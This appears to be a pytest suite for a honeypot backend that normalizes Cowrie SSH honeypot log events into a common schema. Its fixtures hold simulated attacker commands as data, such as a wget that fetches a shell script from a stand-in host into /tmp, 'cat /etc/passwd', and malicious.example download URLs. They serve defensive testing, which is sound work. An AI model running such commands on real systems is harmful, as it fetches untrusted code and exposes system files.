"""Every Cowrie event type the ingestion must understand (RF-01, RF-02).

The suite is data driven on purpose: the registration table in
``normalization.cowrie`` can grow or drift, and a new row that nobody exercised
is exactly how a mistyped ``event_type`` reaches the dashboard.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

import pytest

from honeypot_backend.normalization import normalize
from honeypot_backend.normalization.cowrie import (
    REQUIRED_EVENT_IDS,
    UNKNOWN_EVENT_ID,
    compute_event_id,
    is_supported,
    supported_event_ids,
)
from honeypot_backend.normalization.events import NormalizedEvent

RECEIVED_AT = datetime(2026, 3, 1, 12, 0, 0, tzinfo=UTC)

SHARED = {
    "sensor": "honeypot-1",
    "src_ip": "203.0.113.10",
    "src_port": 51234,
    "dst_ip": "198.51.100.5",
    "dst_port": 2222,
    "protocol": "ssh",
    "session": "sess-1",
}

#: ``eventid`` -> (extra payload, expected event_type, expected category, expected details)
CASES: dict[str, tuple[dict[str, Any], str, str, dict[str, Any]]] = {
    "cowrie.session.connect": (
        {"version": "SSH-2.0-OpenSSH_8.9p1", "message": "New connection"},
        "session.connect",
        "session",
        {"client_version": "SSH-2.0-OpenSSH_8.9p1", "message": "New connection"},
    ),
    "cowrie.session.closed": (
        {"duration": 12.5},
        "session.closed",
        "session",
        {"duration_ms": 12500.0},
    ),
    "cowrie.session.params": (
        {"arch": "linux-x64-lsb"},
        "session.params",
        "session",
        {"arch": "linux-x64-lsb"},
    ),
    "cowrie.login.success": (
        {"username": "root", "password": "toor", "method": "password"},
        "auth.login_success",
        "authentication",
        {"auth_method": "password", "password": "toor"},
    ),
    "cowrie.login.failed": (
        {"username": "admin", "password": "bad"},
        "auth.login_failed",
        "authentication",
        {"auth_method": "password", "password": "bad"},
    ),
    "cowrie.client.fingerprint": (
        {"username": "root", "fingerprint": "aa:bb:cc", "type": "ssh-rsa"},
        "auth.key_fingerprint",
        "authentication",
        {"auth_method": "publickey", "key_fingerprint": "aa:bb:cc", "key_type": "ssh-rsa"},
    ),
    "cowrie.command.input": (
        {"username": "root", "input": "wget http://x/y.sh -O /tmp/y.sh", "realm": "sess-1"},
        "command.input",
        "command",
        {"command_line": "wget http://x/y.sh -O /tmp/y.sh", "command": "wget", "realm": "sess-1"},
    ),
    "cowrie.command.success": (
        {"username": "root", "input": "uname -a"},
        "command.success",
        "command",
        {"command_line": "uname -a", "command": "uname", "arguments": ["-a"]},
    ),
    "cowrie.command.failed": (
        {"username": "root", "input": "nosuchbinary"},
        "command.failed",
        "command",
        {"command_line": "nosuchbinary", "command": "nosuchbinary"},
    ),
    "cowrie.command.chpasswd": (
        {"username": "root", "password": "newpass", "realm": "sess-1"},
        "command.chpasswd",
        "command",
        {"realm": "sess-1"},
    ),
    "cowrie.session.input": (
        {"username": "root", "input": "cat /etc/passwd"},
        "command.stdin",
        "command",
        {"command_line": "cat /etc/passwd", "command": "cat"},
    ),
    "cowrie.session.file_download": (
        {
            "username": "root",
            "url": "http://malicious.example/x86.sh",
            "outfile": "downloads/x86.sh",
            "filename": "x86.sh",
            "destfile": "x86.sh",
            "shasum": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "md5sum": "d41d8cd98f00b204e9800998ecf8427e",
            "duplicate": False,
        },
        "transfer.download",
        "transfer",
        {
            "url": "http://malicious.example/x86.sh",
            "outfile": "downloads/x86.sh",
            "filename": "x86.sh",
            "destfile": "x86.sh",
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
            "md5": "d41d8cd98f00b204e9800998ecf8427e",
            "duplicate": False,
        },
    ),
    "cowrie.session.file_download.failed": (
        {"url": "http://malicious.example/gone.sh", "error": "404 Not Found"},
        "transfer.download_failed",
        "transfer",
        {"url": "http://malicious.example/gone.sh", "error": "404 Not Found"},
    ),
    "cowrie.session.file_upload": (
        {"username": "root", "url": "http://x/up.sh", "destfile": "up.sh"},
        "transfer.upload",
        "transfer",
        {"url": "http://x/up.sh", "destfile": "up.sh"},
    ),
    "cowrie.client.version": (
        {"version": "SSH-2.0-OpenSSH_9.6"},
        "client.version",
        "client",
        {"client_version": "SSH-2.0-OpenSSH_9.6"},
    ),
    "cowrie.client.kex": (
        {
            "hassh": "a1b2c3",
            "hasshAlgorithms": "h1-sha256",
            "kexAlgs": "curve25519",
            "keyAlgs": "ssh-rsa",
            "encCS": "aes256-ctr",
            "macCS": "hmac-sha2-256",
            "compCS": "none",
            "langCS": "",
        },
        "client.kex",
        "client",
        {
            "hassh": "a1b2c3",
            "hassh_algorithms": "h1-sha256",
            "kex_algorithms": "curve25519",
            "host_key_algorithms": "ssh-rsa",
            "encryption_algorithms": "aes256-ctr",
            "mac_algorithms": "hmac-sha2-256",
            "compression_algorithms": "none",
        },
    ),
    "cowrie.client.size": (
        {"width": 80, "height": 24},
        "client.size",
        "client",
        {"width": 80, "height": 24},
    ),
    "cowrie.client.var": (
        {"name": "TERM", "value": "xterm-256color"},
        "client.var",
        "client",
        {"name": "TERM", "value": "xterm-256color"},
    ),
    "cowrie.log.open": (
        {"ttylog": "ttylog-1.log"},
        "session.ttylog_open",
        "session",
        {},
    ),
    "cowrie.log.closed": (
        {"ttylog": "ttylog-1.log", "size": 4096},
        "session.ttylog_closed",
        "session",
        {},
    ),
    "cowrie.telnet.error": (
        {"reason": "invalid negotiation", "attempt": 2},
        "client.telnet_error",
        "client",
        {"reason": "invalid negotiation", "attempt": 2},
    ),
    "cowrie.client.malformed_packet": (
        {"data": "deadbeef"},
        "client.malformed_packet",
        "client",
        {"data": "deadbeef"},
    ),
}


def build(event_id: str, payload: dict[str, Any]) -> dict[str, Any]:
    return {
        **SHARED,
        **payload,
        "eventid": event_id,
        "timestamp": "2026-03-01T11:59:00.000000Z",
    }


def test_the_case_table_covers_every_registered_event_type() -> None:
    """A new mapping without a case here is coverage that silently vanished."""

    assert set(CASES) == set(supported_event_ids())


def test_the_case_table_covers_the_event_types_rf01_requires() -> None:
    assert REQUIRED_EVENT_IDS <= set(CASES)


@pytest.mark.parametrize("event_id", sorted(CASES))
def test_an_event_is_normalized_to_its_declared_shape(event_id: str) -> None:
    payload, event_type, category, details = CASES[event_id]

    event = normalize(build(event_id, payload), received_at=RECEIVED_AT)

    assert isinstance(event, NormalizedEvent)
    assert event.source_event_id == event_id
    assert event.event_type == event_type
    assert event.event_category == category
    for key, value in details.items():
        assert event.details[key] == value, f"{event_id}.details[{key}]"


@pytest.mark.parametrize("event_id", sorted(CASES))
def test_every_event_keeps_the_attributes_rf02_requires(event_id: str) -> None:
    """RF-02: date, source IP, event type, session and user when available."""

    event = normalize(build(event_id, CASES[event_id][0]), received_at=RECEIVED_AT)

    assert event.occurred_at is not None
    assert event.event_type
    assert event.source_ip == "203.0.113.10"
    assert event.source_port == 51234
    assert event.destination_port == 2222
    assert event.session_id == "sess-1"
    assert event.received_at == RECEIVED_AT


@pytest.mark.parametrize("event_id", sorted(CASES))
def test_the_identifier_is_deterministic(event_id: str) -> None:
    raw = build(event_id, CASES[event_id][0])

    first = normalize(raw, received_at=RECEIVED_AT)
    second = normalize(raw, received_at=RECEIVED_AT)

    assert first.event_id == second.event_id
    assert first.event_id == compute_event_id(raw)


@pytest.mark.parametrize(
    ("event_id", "expected_outcome"),
    [
        ("cowrie.login.success", "success"),
        ("cowrie.login.failed", "failure"),
        ("cowrie.command.success", "success"),
        ("cowrie.command.failed", "failure"),
    ],
)
def test_the_outcome_follows_the_cowrie_convention(event_id: str, expected_outcome: str) -> None:
    event = normalize(build(event_id, CASES[event_id][0]), received_at=RECEIVED_AT)

    assert event.outcome == expected_outcome


def test_a_login_event_carries_the_username() -> None:
    event = normalize(build("cowrie.login.failed", CASES["cowrie.login.failed"][0]), received_at=RECEIVED_AT)

    assert event.username == "admin"


def test_a_command_event_carries_the_username() -> None:
    event = normalize(build("cowrie.command.success", CASES["cowrie.command.success"][0]), received_at=RECEIVED_AT)

    assert event.username == "root"


def test_a_download_event_carries_the_username() -> None:
    event = normalize(
        build("cowrie.session.file_download", CASES["cowrie.session.file_download"][0]),
        received_at=RECEIVED_AT,
    )

    assert event.username == "root"


def test_an_unknown_event_type_is_still_stored() -> None:
    """A Cowrie release that adds an event must not stop the ingestion."""

    raw = build("cowrie.some.brand.new.event", {"reason": "from a newer Cowrie"})

    event = normalize(raw, received_at=RECEIVED_AT)

    assert event.event_type == "other.some_brand_new_event"
    assert event.event_category == "other"
    assert event.source_event_id == "cowrie.some.brand.new.event"
    assert event.details["reason"] == "from a newer Cowrie"


def test_a_shared_attribute_is_never_duplicated_into_details() -> None:
    """Known limitation: ``message`` is shared, so it is not lifted anywhere.

    ``message`` is in ``SHARED_ATTRIBUTES`` and ``NormalizedEvent`` has no
    field for it, so an event type handled by the generic extractor ends up
    without its message in ``details``. It is still available in ``raw``. This
    matters for ``cowrie.telnet.error``, whose payload usually *is* the message.
    """

    raw = build("cowrie.some.brand.new.event", {"message": "only a message"})

    event = normalize(raw, received_at=RECEIVED_AT)

    assert "message" not in event.details
    assert event.raw["message"] == "only a message"


def test_a_mapped_event_keeps_the_message_in_details() -> None:
    """Where an extractor names ``message`` explicitly, it survives."""

    event = normalize(
        build("cowrie.session.connect", {"version": "SSH-2.0-OpenSSH_8.9", "message": "New connection"}),
        received_at=RECEIVED_AT,
    )

    assert event.details["message"] == "New connection"


def test_an_unknown_event_type_is_reported_as_unsupported() -> None:
    assert is_supported("cowrie.some.brand.new.event") is False
    assert is_supported("cowrie.login.failed") is True


def test_an_event_without_an_eventid_keeps_its_timestamp() -> None:
    raw = {**SHARED, "timestamp": "2026-03-01T11:59:00.000000Z", "message": "no eventid"}

    event = normalize(raw, received_at=RECEIVED_AT)

    assert event.source_event_id == UNKNOWN_EVENT_ID
    assert event.occurred_at is not None


def test_the_raw_payload_is_preserved_for_investigation() -> None:
    raw = build("cowrie.login.failed", CASES["cowrie.login.failed"][0])

    event = normalize(raw, received_at=RECEIVED_AT)

    assert event.raw == raw


def test_the_legacy_duration_field_is_still_understood() -> None:
    """Older Cowrie versions send ``duration`` in seconds."""

    event = normalize(build("cowrie.session.closed", {"duration": 2.5}), received_at=RECEIVED_AT)

    assert event.details["duration_ms"] == 2500.0


def test_the_explicit_duration_field_wins_over_the_legacy_one() -> None:
    event = normalize(
        build("cowrie.session.closed", {"duration_ms": 42, "duration": 99}),
        received_at=RECEIVED_AT,
    )

    assert event.details["duration_ms"] == 42
